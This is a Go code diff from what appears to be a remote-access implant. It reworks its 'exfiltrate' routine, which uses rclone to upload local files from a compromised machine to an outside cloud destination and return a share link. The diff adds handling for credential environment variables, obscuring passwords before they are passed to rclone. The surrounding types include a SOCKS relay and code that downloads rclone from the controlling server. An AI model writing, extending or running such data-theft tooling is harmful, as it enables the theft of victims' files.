@@ -70,14 +70,15 @@ type socksRelay struct {
 }
 
 type exfilJob struct {
-	LocalPath   string            `json:"local_path"`
-	Profile     string            `json:"profile"`
-	Backend     string            `json:"backend"`
-	Dest        string            `json:"dest"`
-	RemoteName  string            `json:"remote_name"`
-	LinkCommand bool              `json:"link_command"`
-	RcloneURL   string            `json:"rclone_url"`
-	Env         map[string]string `json:"env"`
+	LocalPath      string            `json:"local_path"`
+	Profile        string            `json:"profile"`
+	Backend        string            `json:"backend"`
+	Dest           string            `json:"dest"`
+	RemoteName     string            `json:"remote_name"`
+	LinkCommand    bool              `json:"link_command"`
+	RcloneURL      string            `json:"rclone_url"`
+	Env            map[string]string `json:"env"`
+	EnvSkipObscure []string          `json:"env_skip_obscure"`
 }
 
 // These values are injected by the authenticated server build endpoint. They
@@ -569,11 +570,24 @@ func exfiltrate(command string, cfg *config, client *http.Client) (string, error
 	if runtime.GOOS == "windows" {
 		args = append(args, "--config", "NUL")
 	}
-	cmd := exec.Command(rclone, args...)
-	cmd.Env = os.Environ()
-	for key, value := range job.Env {
-		cmd.Env = append(cmd.Env, key+"="+value)
+	env := os.Environ()
+	skipObscure := make(map[string]struct{}, len(job.EnvSkipObscure))
+	for _, key := range job.EnvSkipObscure {
+		skipObscure[key] = struct{}{}
 	}
+	for key, value := range job.Env {
+		if strings.HasSuffix(strings.ToUpper(key), "_PASS") {
+			if _, skip := skipObscure[key]; !skip {
+				value, err = obscureRcloneValue(rclone, value)
+				if err != nil {
+					return cloudUploadResult(job, false, info.Size(), err.Error()), nil
+				}
+			}
+		}
+		env = append(env, key+"="+value)
+	}
+	cmd := newCommand(rclone, args...)
+	cmd.Env = env
 	output, runErr := cmd.CombinedOutput()
 	if runErr != nil {
 		return cloudUploadResult(job, false, info.Size(), strings.TrimSpace(string(output))), nil
@@ -584,11 +598,25 @@ func exfiltrate(command string, cfg *config, client *http.Client) (string, error
 		if runtime.GOOS == "windows" {
 			linkArgs = append(linkArgs, "--config", "NUL")
 		}
-		if linkOut, linkErr := exec.Command(rclone, linkArgs...).CombinedOutput(); linkErr == nil {
+		linkCmd := newCommand(rclone, linkArgs...)
+		linkCmd.Env = env
+		if linkOut, linkErr := linkCmd.CombinedOutput(); linkErr == nil {
 			link = strings.TrimSpace(string(linkOut))
 		}
 	}
 	return cloudUploadResultWithLink(job, true, info.Size(), "", link), nil
+}
+
+func obscureRcloneValue(rclone, value string) (string, error) {
+	output, err := newCommand(rclone, "obscure", value).CombinedOutput()
+	if err != nil {
+		return "", fmt.Errorf("rclone obscure failed: %s", strings.TrimSpace(string(output)))
+	}
+	obscured := strings.TrimSpace(string(output))
+	if obscured == "" {
+		return "", errors.New("rclone obscure returned an empty value")
+	}
+	return obscured, nil
 }
 
 func downloadRclone(client *http.Client, cfg *config, relativeURL string) (string, error) {
